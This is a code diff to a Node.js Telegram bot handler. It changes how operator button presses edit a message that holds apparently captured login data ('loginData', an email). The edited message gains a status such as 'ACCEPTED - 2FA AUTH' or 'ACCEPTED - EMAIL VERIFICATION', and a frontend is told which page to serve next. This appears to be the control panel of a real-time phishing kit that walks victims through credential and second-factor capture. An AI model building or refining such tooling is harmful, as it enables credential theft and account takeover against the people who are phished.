@@ -109,19 +109,23 @@ bot.on("callback_query", async (query) => {
       console.log(`   Frontend should receive status: ${action === "page1" ? "accepted1" : action === "page2" ? "accepted2" : "rejected"}`);
       
       // ============================================================================
-      // 📝 EDIT ORIGINAL MESSAGE - Remove buttons and show status
+      // 📝 EDIT ORIGINAL MESSAGE - Keep original info and add status
       // ============================================================================
       
       console.log(`\n   📝 EDITING ORIGINAL MESSAGE...`);
       
-      let editMessage = "";
+      let statusLine = "";
       if (action === "page1") {
-        editMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+        statusLine = `\n\n✅ <b>ACCEPTED - 2FA AUTH</b> ✅`;
       } else if (action === "page2") {
-        editMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+        statusLine = `\n\n✅ <b>ACCEPTED - EMAIL VERIFICATION</b> ✅`;
       } else if (action === "reject") {
-        editMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
+        statusLine = `\n\n❌ <b>REJECTED</b> ❌`;
       }
+      
+      // Get the original message from storage or reconstruct it
+      const loginData = query.message?.text || "";
+      const editMessage = loginData + statusLine;
       
       try {
         const botToken = process.env.BOT_TOKEN;
@@ -147,7 +151,7 @@ bot.on("callback_query", async (query) => {
         
         if (editResponse.ok) {
           console.log(`      ✅ Message edited successfully!`);
-          console.log(`      New text: ${editMessage}`);
+          console.log(`      Status added: ${statusLine}`);
         } else {
           console.error(`      ❌ Failed to edit message`);
         }
